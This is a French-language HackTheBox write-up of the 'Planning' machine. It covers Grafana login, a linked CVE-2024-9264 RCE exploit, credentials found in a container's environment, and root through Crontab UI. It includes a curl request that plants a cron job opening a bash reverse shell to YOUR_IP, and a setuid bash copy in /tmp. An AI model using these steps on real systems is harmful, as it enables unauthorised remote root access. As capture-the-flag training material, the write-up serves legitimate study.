---
title: Planning
description: I'm definitely planning to finish this one
tags:
  - HTB
  - machine
  - cron
date: 2026-04-07T16:31
tasks:
  - format
parent file:
  - "[[HTB MOC]]"
os: linux
difficulty: easy
category:
  - writeups
  - htb
season: "8"
seasonal: no
---

On commence avec des identifiants `admin:0D5oT70Fq13EvB5r` mais on ne peut pas se connecter avec ssh avec, on ne peut pas s'en servir pour le moment.

# Foothold

On trouve les ports 22 et 80 avec le scan nmap et, sur le site web, les pages:
```
{"status":200,"url":"http://planning.htb/index.php"}
{"status":200,"url":"http://planning.htb/contact.php"}
{"status":200,"url":"http://planning.htb/detail.php"}
{"status":200,"url":"http://planning.htb/."}
{"status":200,"url":"http://planning.htb/about.php"}
```

La page principale propose... des cours.
![[Pasted image 20260407165604.png]]

On teste quelques injections sql sur la bare de recherche mais rien d'apparent ne ressort.

Bien que cela ne soit pas dans le top 1 million, il nous fallait trouver le sous-domaine `grafana`. On va donc tester ce sous-domaine. On y trouve une page de connexion et, cette fois, les identifiants fonctionnent.
![[Pasted image 20260409121647.png]]


En haut à droite, sur le point d'interrogation, on retrouve qu'on utilise grafana 11.0
![[Pasted image 20260409122636.png]]

Ca tombe bien, on trouve un [exploit]([https://github.com/nollium/CVE-2024-9264](https://github.com/z3k0sec/CVE-2024-9264-RCE-Exploit)) pour cette version exactement. On arrive assez facilement à exploiter la RCE et obtenir un shell.
![[Pasted image 20260409182728.png]]

# Privilege Escalation to user

On remarque avec cet accès qu'on est root mais aussi qu'il n'y a pas de flag dans les dossiers utilisateurs ni dans le dossier root. On peut donc en déduire que l'on est dans un docker et que notre utilisateur a probablement des droits intéressants. On va donc essayer d'obtenir un shell dans la bonne machine. (on voit surtout qu'on est dans un environnement docker parce que `/.dockerenv` existe).

En listant `env` on arrive à trouver un mot de passe:
```
env
HISTCONTROL=ignorespace
AWS_AUTH_SESSION_DURATION=15m
HOSTNAME=7ce659d667d7
PWD=/usr/share/grafana
AWS_AUTH_AssumeRoleEnabled=true
GF_PATHS_HOME=/usr/share/grafana
AWS_CW_LIST_METRICS_PAGE_LIMIT=500
HOME=/usr/share/grafana
TERM=xterm-256color
AWS_AUTH_EXTERNAL_ID=
SHLVL=3
GF_PATHS_PROVISIONING=/etc/grafana/provisioning
GF_SECURITY_ADMIN_PASSWORD=RioTecRANDEntANT!
GF_SECURITY_ADMIN_USER=enzo
PS1=$(command printf "\[\033[01;31m\](remote)\[\033[0m\] \[\033[01;33m\]$(whoami)@$(hostname)\[\033[0m\]:\[\033[1;36m\]$PWD\[\033[0m\]\$ ")
GF_PATHS_DATA=/var/lib/grafana
GF_PATHS_LOGS=/var/log/grafana
PATH=/usr/local/bin:/usr/share/grafana/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
AWS_AUTH_AllowedAuthProviders=default,keys,credentials
GF_PATHS_PLUGINS=/var/lib/grafana/plugins
GF_PATHS_CONFIG=/etc/grafana/grafana.ini
_=/usr/bin/env
```

![[Pasted image 20260410094724.png]]

On a donc des identifiants pour l'utilisateur enzo `enzo:RioTecRANDEntANT!`. On confirme quand même que l'on ne peut pas monter la partition au cas où puis on se connecte en ssh.
![[Pasted image 20260410100607.png]]

# PrivEsc to root

On lance linpeas après avoir testé les options les plus courantes et il nous toruve rapidement les identifiants
```
crontab-ui binary found at: /usr/bin/crontab-uiService: crontab-ui.service (state: active, User: root)
  └─ Basic-Auth credentials in Environment: user='root' pwd='P4ssw0rdS0pRi0T3c'
  └─ CRON_DB_PATH: /opt/crontabs
  └─ Listener detected on 127.0.0.1:8000 (likely Crontab UI).
  └─ DB dir perms: drwxr-xr-x root root
  └─ Inspecting /opt/crontabs/crontab.db for embedded secrets in commands (zip -P / --password / pass/token/secret)...
sed: -e expression #1, char 25: unterminated `s' command
```

En fait on a obtenu l'accès à un crontab basé sur un gui, on peut s'y connecter avec
```

```

Et pour en abuser, on upload notre crontab malicieux
```
curl -u root:P4ssw0rdS0pRi0T3c \
  -X POST http://127.0.0.1:8000/save \
  --data 'name=shell&command=bash+-c+"bash+-i+>%26+/dev/tcp/YOUR_IP/9001+0>%261"&schedule=*+*+*+*+*&stopped=false'
```


[hacktricks](https://hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html?highlight=crontab-ui#crontab-ui-alseambusher-running-as-root--web-based-scheduler-privesc)

On forward le port 8000 vers un port local:
```
ssh -L 9001:localhost:8000 enzo@planning.htb
```

On voit que l'on a bien une page de connexion sur `http://localhost:9001`.

On ajoute un cron job:
```
cp /bin/bash /tmp/rootshell && chmod 6777 /tmp/rootshell
```
![[Pasted image 20260410121944.png]]

Et enfin, sur la machine, en ssh, on utilise le shell nouvellement créé.
```
/tmp/rootshell -p
```

Il faut savoir que l'on peut forcer le lancement du script sur le site directement. Et voilà, notre root shell.
![[Pasted image 20260410122717.png]]

![[Pasted image 20260410122824.png]]